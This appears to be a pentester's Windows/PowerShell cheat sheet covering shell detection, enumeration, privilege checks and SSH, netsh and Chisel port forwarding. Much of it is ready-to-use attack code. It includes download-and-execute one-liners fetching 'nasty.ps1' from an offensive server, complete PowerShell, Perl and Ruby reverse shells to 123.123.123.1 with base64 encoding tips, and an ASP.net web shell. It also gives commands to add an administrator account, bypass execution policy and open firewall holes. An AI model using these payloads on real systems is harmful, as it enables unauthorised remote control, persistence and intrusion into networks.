##Check if CMD or Powershell (by PetSerA)
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

----

##Show file content
type file.txt
more file.txt
Get-Content file.txt

----

#Download a file
#Powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://123.123.123.1/nastyscript.ps1")

#CMD
bitsadmin /transfer downloadJob /download /priority normal http://my.offensive.server/nasty.ps1 c:\nice.ps1
certutil.exe -urlcache -split -f "https://my.offensive.server/nasty.ps1" nice.ps1

----

##Reverse shell
$Oneliner = '$tcp_client=New-Object System.Net.Sockets.TCPClient("123.123.123.1",1234);$client_stream=$tcp_client.GetStream();[byte[]]$stream_bytes=0..65535|%{0};while(($i=$client_stream.Read($stream_bytes,0,$stream_bytes.Length)) -ne 0){;$stream_data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($stream_bytes,0,$i);$response=(iex $stream_data 2>&1 | Out-String );$response2=$response+"PS "+(pwd).Path + "> ";$response_byte=([text.encoding]::ASCII).GetBytes($response2);$client_stream.Write($response_byte,0,$response_byte.Length);$client_stream.Flush()};$tcp_client.Close()'

#Encoded to bytes if needed
$ToBytes = [System.Text.Encoding]::Unicode.GetBytes($Oneliner)

#Encoded to base64 if needed as a parameter etc.
$Base64Enc =[Convert]::ToBase64String($ToBytes)

!REMEMBER! make sure you use UTF16-LE, which for example Linux base64 does not do! (thanks to byt3bl33d3r!)
#Commandline for Unicode
echo "iex(command)" | iconv --to-code UTF-16LE | base64 -w 0
#Commandline for UTF8 ([System.Text.Encoding]::UTF8.GetBytes() won't work on exec
echo -n "abcd" | iconv -f UTF8 -t UTF16LE | base64
#Python
from base64 import b64encode
b64encode('iex(command)'.encode('UTF-16LE'))
#Ruby:
require "base64"
Base64.encode64('iex(command)'.force_encoding('UTF-16LE'))

#Thanks to UB3RSEC
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"123.123.123.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

#You can listen for connections on nc -lnvp 1234 for example

----

##Web shell

#ASP.net oneliner webshell, thanks to Seguranca-informatica
#Call by issuing: http://123.123.123.1/shell.asp?cmd=dir
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

----

#Well-known-SIDs:
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

----

#Get installed apps info:
#64bit:
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
#32bit:
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#List network connections
netstat -aon

#Show network interfaces
ipconfig /all

#Show routing table
route print

#System info
systeminfo

#Always lookout for these: Administrators, Backup Operators, Remote Desktop Users, Remote Management User
#Remote Desktop Users can leverage RDP
#Remote Management User can leverage WinRM
#Backup Operators can operate on files they don't own
#"Log on as a batch job" user rights enables leveraging scheduled tasks
#Remember you can elevate with: runas /user:masterAdmin cmd

#User info
whoami
Get-LocalUser
net user username
whoami /groups

#Check what privileges the user has
whoami /priv

#Get path for a bimary
where powershell

#Add user
net user username password /add
net localgroup Adiministrators username /add

#Change user pass
net username password

#Run with other user credentials (you need the password too)
runas /user:otheruser powershell

#Group info
Get-LocalGroup
Get-LocalGroupMember groupname
net localgroup Administrators 

#Process Info
Get-Process

#Search for files recursively
Get-ChildItem -Path C:\ -Include *.pdf,*.txt -File -Recurse -ErrorAction SilentlyContinue

#Get user PS command history
Get-History

#Check where PSReadline history is saved
(Get-PSReadlineOption).HistorySavePath

#See running apps
Get-CimInstance -ClassName win32_service | Select Name, State, Pathname | Where-Object {$_.State -like 'running'}

#See application startup type and under which user it get started
Get-CimInstance -ClassName win32_service | Select Name, StartMode, StartName | Where-Object {$_.Name -like 'Apac*'}

#View current user's rightst for binary
icacls "c:\path\to\binary.exe"

#Check if service name,pathname is unquoted (if it is and contains spaces -> possibility to exploit search order)
#First findstr is case insensitive and reverse matching, so only paths not in c:\windows\
#Second findstr also case insensitive and reverse matching, so finds paths not containing quotes
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

#Start/stop services
net start/stop service
start-service/stop-service/restart-service service

#Restart in 1 sec, requires the user having SeShudownPrivilege set
shutdown /r /t1

#Enable running scripts
powershell -ep bypass

#Show the PATH environment variable
$env:path

#List scheduled tasks
Get-ScheduledTask
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v /TN "\Microsoft\Task Name"

----
#Port forwarding

#SSH local port forwarding, listening on all interfaces on on host's port 4455, forwarding through SSH tunnel between current host and 10.0.20.1 to 10.10.10.1 port 5544
#Meaning: outside<--->host:4455<->host<---SSH TUNNEL--->10.0.20.1<--->10.10.10.1:5544, -N makes sure not to open a shell and -L means local forwarding, no output after password
ssh -N -L 0.0.0.0:4455:10.10.10.1:5544 r00t@10.0.20.1

#SSH dynamic port forwarding, listening on hosts all interfaces for connections to port 3456, then forwarding traffic through a tunnel between the host an 10.0.20.1 to any destination port
#Meaning outside<--->host:3456<->host<---SSH TUNNEL--->10.0.20.1<--->any host and port on this side, this is SOCKS, so might need for example proxychains to force traffic as SOCSK
ssh -N -D 0.0.0.0:3456 r00t@10.0.20.1
#To use proxychains you'd need to add "socks5 10.0.20.1 3456" to /etc/proxychains4.conf, then just normally connect preceeding with proxychains command: proxychains smbclient -L //10.0.30.1/ -U admin --password=r00t
#You can also run nmap over this tunnel with proxychains

#SSH remote port forwarding, you need to have sshd running on your machine
# -N makes sure not to open a shell and -R means remote forwarding
# From your remote host running SSHD on localhost on port 5432 redirect through the host running this command to 10.10.10.1 port 5432 authenticating on your remote host's LAN/WAN side sshd
ssh -N -R 127.0.0.1:2345:10.10.10.1:5432 user@192.168.12.34

#SSH remote dynamic port forwarding, again you need sshd running on your machine
# -N makes sure not to open a shell and -R means remote forwarding
# Binds to your hosts loopback port 6666 from the connecting host, authenticating over your host's LAN/WAN side sshd
ssh -N -R 6666 user@192.168.12.34

#Remote port forward <from the socket on your host>:<to the host running plink>:<port to redirect traffic to> <your host ip>
plink.exe -ssh -l username -pw password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.12.34

#Using netsh requires admin privileges
#add a portproxy rule to forward traffic from an IPv4 listener to an IPv4 port (v4tov4) listener port 1234, listener IPv4 address 192.168.12.34 
#forward to port 22 (connectport) on host 10.0.20.1 (connectaddress)
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.12.34 connectport=22 connectaddress=10.0.20.1
#Openingn a hole in the Windows firewall with netsh for the above
netsh advfirewall firewall add rule name="portforward_ssh_1234" protocol=TCP dir=in localip=192.168.12.34 localport=1234 action=allow

#Show portproxy rules
netsh interface portproxy show all

#Using Chisel (https://github.com/jpillora/chisel)
#Run a Chisel server on your host, bound on port 8080 and enabling reverse port forwarding
chisel server --port 8008 --reverse
#On the other end use client and connect to your Chisel server, start the reverse forwarding socks
chisel client 192.168.12.34:8008 R:socks > /dev/null 2>&1 &
